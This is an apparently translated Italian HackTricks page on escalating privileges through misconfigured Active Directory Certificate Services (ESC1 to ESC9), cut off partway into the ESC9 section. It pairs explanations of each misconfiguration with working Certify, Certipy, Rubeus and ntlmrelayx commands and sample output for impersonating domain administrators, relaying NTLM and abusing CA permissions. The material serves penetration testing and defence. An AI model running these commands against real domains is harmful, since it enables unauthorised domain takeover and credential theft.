# Escalation del dominio AD CS

{{#include ../../../banners/hacktricks-training.md}}


**Questa è una sintesi delle sezioni sulle tecniche di escalation dei post:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Modelli di certificato mal configurati - ESC1

### Spiegazione

### Modelli di certificato mal configurati - ESC1 spiegati

- **I diritti di enrolment sono concessi a utenti con basso privilegio dall'Enterprise CA.**
- **Non è richiesta l'approvazione del manager.**
- **Non sono necessarie firme da parte di personale autorizzato.**
- **I security descriptor sui template di certificato sono eccessivamente permissivi, permettendo a utenti con basso privilegio di ottenere diritti di enrolment.**
- **I template di certificato sono configurati per definire EKU che facilitano l'autenticazione:**
- Extended Key Usage (EKU) identificatori come Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), o nessun EKU (SubCA) sono inclusi.
- **La possibilità per i richiedenti di includere un subjectAltName nella Certificate Signing Request (CSR) è consentita dal template:**
- Active Directory (AD) dà priorità al subjectAltName (SAN) in un certificato per la verifica dell'identità se presente. Ciò significa che specificando il SAN in una CSR, è possibile richiedere un certificato per impersonare qualsiasi utente (es. un domain administrator). Se un SAN può essere specificato dal richiedente è indicato nell'oggetto AD del template di certificato attraverso la proprietà `mspki-certificate-name-flag`. Questa proprietà è una bitmask, e la presenza del flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` consente la specifica del SAN da parte del richiedente.

> [!CAUTION]
> La configurazione descritta permette a utenti con basso privilegio di richiedere certificati con qualsiasi SAN desiderato, abilitando l'autenticazione come qualsiasi principal di dominio tramite Kerberos o SChannel.

Questa funzionalità a volte è abilitata per supportare la generazione al volo di certificati HTTPS o host da parte di prodotti o servizi di deployment, o per mancanza di comprensione.

Si nota che creare un certificato con questa opzione genera un avviso, cosa che non accade quando un template di certificato esistente (come il template `WebServer`, che ha `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato) viene duplicato e poi modificato per includere un OID di autenticazione.

### Abuso

Per **trovare template di certificato vulnerabili** puoi eseguire:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Per **abusare di questa vulnerabilità per impersonare un amministratore** si potrebbe eseguire:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Poi puoi trasformare il certificato generato **in `.pfx`** e usarlo per **autenticarti con Rubeus o certipy** nuovamente:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
I binari di Windows "Certreq.exe" & "Certutil.exe" possono essere usati per generare il PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

L'enumerazione dei template di certificato nello schema di configurazione della AD Forest, nello specifico quelli che non richiedono approvazione o firme, che possiedono un Client Authentication o Smart Card Logon EKU, e con il flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` abilitato, può essere effettuata eseguendo la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Template di certificato mal configurati - ESC2

### Spiegazione

Il secondo scenario di abuso è una variazione del primo:

1. I diritti di enrollment sono concessi a utenti con privilegi bassi dall'Enterprise CA.
2. Il requisito dell'approvazione del manager è disabilitato.
3. La necessità di firme autorizzate è omessa.
4. Un descrittore di sicurezza eccessivamente permissivo sul template di certificato concede diritti di registrazione dei certificati a utenti con privilegi bassi.
5. **Il template di certificato è definito per includere la Any Purpose EKU o nessuna EKU.**

La **Any Purpose EKU** permette a un attaccante di ottenere un certificato per **qualsiasi scopo**, inclusi client authentication, server authentication, code signing, ecc. La stessa **tecnica usata per ESC3** può essere impiegata per sfruttare questo scenario.

I certificati senza **EKU**, che agiscono come certificati subordinate CA, possono essere sfruttati per **qualsiasi scopo** e possono **anche essere usati per firmare nuovi certificati**. Di conseguenza, un attaccante potrebbe specificare EKU arbitrarie o campi nei nuovi certificati utilizzando un certificato di subordinate CA.

Tuttavia, i nuovi certificati creati per **domain authentication** non funzioneranno se la subordinate CA non è trusted dall'oggetto `NTAuthCertificates`, che è l'impostazione di default. Nonostante ciò, un attaccante può comunque creare **nuovi certificati con qualsiasi EKU** e valori di certificato arbitrari. Questi potrebbero essere potenzialmente **abusati** per una vasta gamma di scopi (es. code signing, server authentication, ecc.) e potrebbero avere implicazioni significative per altre applicazioni nella rete come SAML, AD FS, o IPSec.

Per enumerare i template che corrispondono a questo scenario all'interno dello schema di configurazione della foresta AD, è possibile eseguire la seguente query LDAP:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### Explanation

Questo scenario è simile al primo e al secondo ma **sfrutta** un **EKU diverso** (Certificate Request Agent) e **2 template diversi** (pertanto ha 2 serie di requisiti),

Il **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), noto come **Enrollment Agent** nella documentazione Microsoft, permette a un principal di **enrollare** per un **certificate** **per conto di un altro utente**.

L'**“enrollment agent”** si registra su un tale **template** e utilizza il certificato risultante per **co-firmare una CSR per conto dell'altro utente**. Dopodiché **invia** la **CSR co-firmata** alla CA, iscrivendosi a un **template** che **permette “enroll on behalf of”**, e la CA risponde con un **certificato appartenente all'“altro” utente**.

**Requirements 1:**

- I diritti di enrollment sono concessi agli utenti a basso privilegio dalla Enterprise CA.
- Il requisito di approvazione del manager è omesso.
- Nessun requisito per firme autorizzate.
- Il security descriptor del template del certificato è eccessivamente permissivo, concedendo diritti di enrollment agli utenti a basso privilegio.
- Il template del certificato include il Certificate Request Agent EKU, permettendo la richiesta di altri template di certificati per conto di altri principal.

**Requirements 2:**

- La Enterprise CA concede diritti di enrollment agli utenti a basso privilegio.
- L'approvazione del manager viene bypassata.
- La versione dello schema del template è o 1 o superiore a 2, e specifica un Application Policy Issuance Requirement che richiede il Certificate Request Agent EKU.
- Un EKU definito nel template del certificato consente l'autenticazione di dominio.
- Le restrizioni per gli enrollment agent non sono applicate sulla CA.

### Abuse

Puoi usare [**Certify**](https://github.com/GhostPack/Certify) o [**Certipy**](https://github.com/ly4k/Certipy) per sfruttare questo scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Gli **utenti** autorizzati a **ottenere** un **enrollment agent certificate**, i template in cui gli enrollment **agents** sono autorizzati ad effettuare l'enrollment e gli **account** per conto dei quali l'enrollment agent può agire possono essere vincolati dalle CA aziendali. Questo si ottiene aprendo lo snap-in `certsrc.msc`, facendo **clic con il tasto destro sulla CA**, selezionando **Properties**, e poi **navigando** alla scheda “Enrollment Agents”.

Tuttavia, va notato che l'impostazione **di default** per le CA è “**Do not restrict enrollment agents**.” Quando gli amministratori abilitano la restrizione sugli enrollment agents impostandola su “Restrict enrollment agents”, la configurazione predefinita rimane estremamente permissiva. Consente a **Everyone** di iscriversi (enroll) a tutti i template come qualsiasi utente.

## Accesso ai template di certificato vulnerabile - ESC4

### **Spiegazione**

Il **security descriptor** sui **certificate templates** definisce le **permissions** che i specifici **AD principals** hanno relativamente al template.

Se un **attaccante** possiede le **permissions** richieste per **alterare** un **template** e **istituire** qualsiasi **exploitable misconfigurations** descritte nelle sezioni precedenti, ciò potrebbe facilitare un'escalation di privilegi.

Permessi rilevanti applicabili ai template di certificato includono:

- **Owner:** Concede il controllo implicito sull'oggetto, permettendo la modifica di qualsiasi attributo.
- **FullControl:** Fornisce autorità completa sull'oggetto, inclusa la capacità di alterare qualsiasi attributo.
- **WriteOwner:** Permette di cambiare il proprietario dell'oggetto a un principal sotto il controllo dell'attaccante.
- **WriteDacl:** Consente di modificare i controlli di accesso, potenzialmente concedendo all'attaccante FullControl.
- **WriteProperty:** Autorizza la modifica di qualsiasi proprietà dell'oggetto.

### Abuse

Per identificare i principals con diritti di modifica sui template e altri oggetti PKI, enumerare con Certify:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Un esempio di privesc simile al precedente:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 si verifica quando un utente ha privilegi di scrittura su un modello di certificato. Questo può, ad esempio, essere abusato per sovrascrivere la configurazione del modello di certificato e rendere il modello vulnerabile a ESC1.

Come possiamo vedere nel percorso sopra, solo `JOHNPC` ha questi privilegi, ma il nostro utente `JOHN` ha il nuovo `AddKeyCredentialLink` edge verso `JOHNPC`. Poiché questa tecnica è correlata ai certificati, ho implementato anche questo attacco, noto come [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Ecco una piccola anteprima del comando `shadow auto` di Certipy per recuperare l'NT hash della vittima.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** può sovrascrivere la configurazione di un template di certificato con un singolo comando. Per **impostazione predefinita**, Certipy **sovrascriverà** la configurazione per renderla **vulnerabile a ESC1**. Possiamo anche specificare il **parametro `-save-old` per salvare la vecchia configurazione**, cosa che sarà utile per **ripristinare** la configurazione dopo il nostro attacco.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Controllo di Accesso agli Oggetti PKI vulnerabile - ESC5

### Spiegazione

La vasta rete di relazioni interconnesse basate su ACL, che include diversi oggetti oltre ai certificate templates e alla certificate authority, può influire sulla sicurezza dell'intero sistema AD CS. Questi oggetti, che possono avere un impatto significativo sulla sicurezza, comprendono:

- L'AD computer object del CA server, che può essere compromesso tramite meccanismi come S4U2Self o S4U2Proxy.
- L'RPC/DCOM server del CA server.
- Qualsiasi oggetto AD discendente o container all'interno del percorso di container specifico `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Questo percorso include, ma non è limitato a, container e oggetti quali il Certificate Templates container, Certification Authorities container, l'NTAuthCertificates object e l'Enrollment Services Container.

La sicurezza del sistema PKI può essere compromessa se un attaccante con privilegi bassi riesce a prendere il controllo di uno qualsiasi di questi componenti critici.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Spiegazione

Il tema trattato nel [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) affronta anche le implicazioni del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, come descritto da Microsoft. Questa configurazione, quando attivata su una Certification Authority (CA), permette l'inclusione di valori definiti dall'utente nel subject alternative name per qualsiasi richiesta, incluse quelle costruite da Active Directory®. Di conseguenza, ciò consente a un **intruso** di richiedere un certificato tramite **qualsiasi template** impostato per l'**autenticazione di dominio**—in particolare quelli aperti alla richiesta da parte di utenti **non privilegiati**, come il template User standard. Come risultato, è possibile ottenere un certificato che permette all'intruso di **autenticarsi** come amministratore di dominio o **qualsiasi altra entità attiva** all'interno del dominio.

Nota: L'approccio per aggiungere nomi alternativi in una Certificate Signing Request (CSR), tramite l'argomento `-attrib "SAN:"` in `certreq.exe` (indicato come “Name Value Pairs”), presenta un **contrasto** rispetto alla strategia di sfruttamento delle SAN in ESC1. Qui la differenza risiede in **come le informazioni dell'account sono incapsulate**—in un attributo del certificato, piuttosto che in un'estensione.

### Abuso

Per verificare se l'impostazione è attivata, le organizzazioni possono utilizzare il seguente comando con `certutil.exe`:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Questa operazione utilizza essenzialmente **remote registry access**, pertanto un approccio alternativo potrebbe essere:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Strumenti come [**Certify**](https://github.com/GhostPack/Certify) e [**Certipy**](https://github.com/ly4k/Certipy) sono in grado di rilevare questa errata configurazione e sfruttarla:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Per modificare queste impostazioni, assumendo di possedere i diritti **di amministratore di dominio** o equivalenti, il seguente comando può essere eseguito da qualsiasi workstation:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Per disabilitare questa configurazione nel tuo ambiente, il flag può essere rimosso con:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Dopo gli aggiornamenti di sicurezza di maggio 2022, i **certificati** emessi di recente conterranno una **estensione di sicurezza** che incorpora la **proprietà `objectSid` del richiedente**. Per ESC1, questo SID è derivato dal SAN specificato. Tuttavia, per **ESC6**, il SID rispecchia il **`objectSid` del richiedente**, non il SAN.\
> Per sfruttare ESC6, è essenziale che il sistema sia suscettibile a ESC10 (Weak Certificate Mappings), che dà priorità al **SAN rispetto alla nuova estensione di sicurezza**.

## Controllo di accesso vulnerabile dell'Autorità di Certificazione - ESC7

### Attacco 1

#### Spiegazione

Il controllo di accesso per un'autorità di certificazione è mantenuto tramite un insieme di autorizzazioni che regolano le azioni della CA. Queste autorizzazioni possono essere visualizzate avviando `certsrv.msc`, cliccando con il tasto destro su una CA, selezionando Proprietà e poi passando alla scheda Sicurezza. Inoltre, le autorizzazioni possono essere enumerate usando il modulo PSPKI con comandi come:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
This provides insights into the primary rights, namely **`ManageCA`** and **`ManageCertificates`**, correlating to the roles of “CA administrator” and “Certificate Manager” respectively.

#### Abuse

Possedere i diritti **`ManageCA`** su una certificate authority permette al principal di manipolare le impostazioni da remoto usando PSPKI. Questo include l'attivazione/disattivazione del flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** per consentire la specifica di SAN in qualsiasi template, un aspetto critico per l'escalation di dominio.

La semplificazione di questo processo è ottenibile tramite l'uso del cmdlet PSPKI **Enable-PolicyModuleFlag**, permettendo modifiche senza interazione diretta con la GUI.

Il possesso dei diritti **`ManageCertificates`** facilita l'approvazione delle richieste in sospeso, aggirando efficacemente la protezione "CA certificate manager approval".

Una combinazione dei moduli **Certify** e **PSPKI** può essere utilizzata per richiedere, approvare e scaricare un certificato:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Attacco 2

#### Spiegazione

> [!WARNING]
> Nell'**attacco precedente** i permessi **`Manage CA`** sono stati usati per **abilitare** il flag **EDITF_ATTRIBUTESUBJECTALTNAME2** per eseguire l'**attacco ESC6**, ma ciò non avrà alcun effetto finché il servizio CA (`CertSvc`) non viene riavviato. Quando un utente ha il diritto di accesso `Manage CA`, gli è anche consentito **riavviare il servizio**. Tuttavia, questo **non significa che l'utente possa riavviare il servizio da remoto**. Inoltre, **ESC6 potrebbe non funzionare immediatamente** nella maggior parte degli ambienti patchati a causa degli aggiornamenti di sicurezza di maggio 2022.

Pertanto, qui viene presentato un altro attacco.

Prerequisiti:

- Solo il permesso **`ManageCA`**
- Permesso **`Manage Certificates`** (può essere concesso da **`ManageCA`**)
- Il template di certificato **`SubCA`** deve essere **abilitato** (può essere abilitato da **`ManageCA`**)

La tecnica si basa sul fatto che utenti con i diritti di accesso `Manage CA` _e_ `Manage Certificates` possono **generare richieste di certificato fallite**. Il template di certificato **`SubCA`** è **vulnerabile a ESC1**, ma **solo gli amministratori** possono effettuare l'iscrizione al template. Quindi, un **utente** può **richiedere** l'iscrizione al **`SubCA`** - la quale verrà **rifiutata** - ma poi **verrà emessa dal responsabile successivamente**.

#### Abuso

Puoi **concederti il diritto di accesso `Manage Certificates`** aggiungendo il tuo utente come nuovo incaricato.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Il **`SubCA`** template può essere **abilitato sulla CA** con il parametro `-enable-template`. Per impostazione predefinita, il template `SubCA` è abilitato.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Se abbiamo soddisfatto i prerequisiti per questo attacco, possiamo iniziare **richiedendo un certificato basato sul modello `SubCA`**.

**Questa richiesta sarà negat**a, ma salveremo la chiave privata e annoteremo l'ID della richiesta.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Con i nostri **`Manage CA` and `Manage Certificates`**, possiamo quindi **emettere la richiesta di certificato fallita** con il comando `ca` e il parametro `-issue-request <request ID>`.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
E infine, possiamo **recuperare il certificato emesso** con il comando `req` e il parametro `-retrieve <request ID>`.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Spiegazione

In aggiunta agli abusi classici di ESC7 (abilitare gli attributi EDITF o approvare richieste in sospeso), **Certify 2.0** ha rivelato una nuova primitive che richiede solo il ruolo *Manage Certificates* (noto anche come **Certificate Manager / Officer**) sull'Enterprise CA.

Il metodo RPC `ICertAdmin::SetExtension` può essere eseguito da qualsiasi principale che possieda *Manage Certificates*. Mentre il metodo veniva tradizionalmente usato dalle CA legittime per aggiornare le estensioni su richieste **in sospeso**, un attaccante può abusarne per **applicare un'estensione di certificato *non di default*** (per esempio una Certificate Issuance Policy OID personalizzata come `1.1.1.1`) a una richiesta che è in attesa di approvazione.

Poiché il template mirato **non definisce un valore di default per quell'estensione**, la CA NON sovrascriverà il valore controllato dall'attaccante quando la richiesta verrà eventualmente emessa. Il certificato risultante conterrà quindi un'estensione scelta dall'attaccante che può:

* Soddisfare requisiti di Application / Issuance Policy di altri template vulnerabili (portando a privilege escalation).
* Iniettare EKU o policy aggiuntive che conferiscono al certificato fiducia inaspettata in sistemi di terze parti.

In breve, *Manage Certificates* – precedentemente considerato la “metà meno potente” di ESC7 – può ora essere sfruttato per escalation di privilegi completa o persistenza a lungo termine, senza toccare la configurazione della CA o richiedere il diritto più restrittivo *Manage CA*.

#### Abusare la primitive con Certify 2.0

1. **Inviare una richiesta di certificato che rimarrà *in sospeso*.** Questo può essere forzato con un template che richiede approvazione del manager:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **Aggiungere un'estensione personalizzata alla richiesta in sospeso** usando il nuovo comando `manage-ca`:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*Se il template non definisce già l'estensione *Certificate Issuance Policies*, il valore sopra sarà preservato dopo l'emissione.*

3. **Emettere la richiesta** (se il tuo ruolo ha anche i diritti di approvazione *Manage Certificates*) o aspettare che un operatore la approvi. Una volta emessa, scarica il certificato:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Il certificato risultante ora contiene l'OID di issuance-policy malevolo e può essere usato in attacchi successivi (es. ESC13, escalation di dominio, ecc.).

> NOTA: Lo stesso attacco può essere eseguito con Certipy ≥ 4.7 tramite il comando `ca` e il parametro `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Spiegazione

> [!TIP]
> In ambienti dove **AD CS è installato**, se esiste un **endpoint di enrollment web vulnerabile** e almeno un **certificate template è pubblicato** che permette **domain computer enrollment e client authentication** (come il template di default **`Machine`**), diventa possibile che **qualsiasi computer con il servizio spooler attivo venga compromesso da un attaccante**!

Diversi **metodi di enrollment basati su HTTP** sono supportati da AD CS, resi disponibili tramite ruoli server aggiuntivi che gli amministratori possono installare. Queste interfacce per l'enrollment basato su HTTP sono suscettibili a **NTLM relay attacks**. Un attaccante, da una **macchina compromessa**, può impersonare qualsiasi account AD che si autentica tramite NTLM inbound. Indossando le credenziali della vittima, queste interfacce web possono essere usate dall'attaccante per **richiedere un certificato client authentication usando i template `User` o `Machine`**.

- L'**web enrollment interface** (una vecchia applicazione ASP disponibile su `http://<caserver>/certsrv/`), di default usa solo HTTP, che non offre protezione contro NTLM relay attacks. Inoltre, permette esplicitamente solo l'autenticazione NTLM tramite l'header Authorization HTTP, rendendo inapplicabili metodi di autenticazione più sicuri come Kerberos.
- Il **Certificate Enrollment Service** (CES), il **Certificate Enrollment Policy** (CEP) Web Service e il **Network Device Enrollment Service** (NDES) di default supportano negotiate authentication tramite il loro header Authorization HTTP. Negotiate authentication **supporta sia** Kerberos che **NTLM**, permettendo a un attaccante di **degradare a NTLM** durante gli attacchi di relay. Sebbene questi web service abilitino HTTPS di default, HTTPS da solo **non protegge contro NTLM relay attacks**. La protezione da NTLM relay attacks per servizi HTTPS è possibile solo quando HTTPS è combinato con channel binding. Sfortunatamente, AD CS non attiva Extended Protection for Authentication su IIS, che è richiesta per il channel binding.

Un problema comune con gli NTLM relay attacks è la **breve durata delle sessioni NTLM** e l'incapacità dell'attaccante di interagire con servizi che **richiedono NTLM signing**.

Tuttavia, questo limite può essere superato sfruttando un NTLM relay attack per ottenere un certificato per l'utente, dato che il periodo di validità del certificato detta la durata della sessione, e il certificato può essere impiegato con servizi che **richiedono NTLM signing**. Per istruzioni sull'uso di un certificato rubato, fare riferimento a:


{{#ref}}
account-persistence.md
{{#endref}}

Un altro limite degli NTLM relay attacks è che **una macchina controllata dall'attaccante deve essere autenticata da un account vittima**. L'attaccante potrebbe aspettare oppure tentare di **forzare** questa autenticazione:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuso**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` elenca gli **endpoint HTTP AD CS abilitati**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

La proprietà `msPKI-Enrollment-Servers` è utilizzata dalle autorità di certificazione aziendali (CA) per memorizzare gli endpoint del Certificate Enrollment Service (CES). Questi endpoint possono essere analizzati e elencati utilizzando lo strumento **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Abuso con Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Abuso con [Certipy](https://github.com/ly4k/Certipy)

La richiesta di un certificato viene effettuata da Certipy di default basandosi sul template `Machine` o `User`, determinato dal fatto che il nome dell'account inoltrato finisca con `$`. La specifica di un template alternativo può essere ottenuta mediante il parametro `-template`.

Si può quindi impiegare una tecnica come [PetitPotam](https://github.com/ly4k/PetitPotam) per forzare l'autenticazione. Quando si tratta di domain controller, è necessario specificare `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## Nessuna estensione di sicurezza - ESC9 <a href="#id-5485" id="id-5485"></a>

### Spiegazione

Il nuovo valore **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) per **`msPKI-Enrollment-Flag`**, indicato come ESC9, impedisce l'inclusione della **nuova estensione di sicurezza `szOID_NTDS_CA_SECURITY_EXT`** in un certificato. Questo flag diventa rilevante quando `StrongCertificateBindingEnforcement` è impostato su `1` (impostazione predefinita), in contrasto con l'impostazione `2`. La sua rilevanza aumenta in scenari in cui potrebbe essere sfruttata una mappatura dei certificati più debole per Kerberos o Schannel (come in ESC10), dato che l'assenza di ESC9 non modificherebbe i requisiti.

Le condizioni in cui l'impostazione di questo flag diventa significativa includono:

- `StrongCertificateBindingEnforcement` non è impostato su `2` (il valore predefinito è `1`), oppure `CertificateMappingMethods` include il flag `UPN`.
- Il certificato è contrassegnato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` all'interno dell'impostazione `msPKI-Enrollment-Flag`.
- Qualsiasi EKU di autenticazione client è specificato dal certificato.
- Sono disponibili permessi `GenericWrite` su un account per compromettere un altro.

### Scenario di abuso

Supponiamo che `John@corp.local` disponga di permessi `GenericWrite` su `Jane@corp.local`, con l'obiettivo di compromettere `Administrator@corp.local`. Il template di certificato `ESC9`, al quale `Jane@corp.local` è autorizzata a registrarsi, è configurato con il flag `CT_FLAG_NO_SECURITY_EXTENSION` nella sua impostazione `msPKI-Enrollment-Flag`.

Inizialmente, l'hash di `Jane` viene acquisito usando Shadow Credentials, grazie al `GenericWrite` di `John`:
```bash
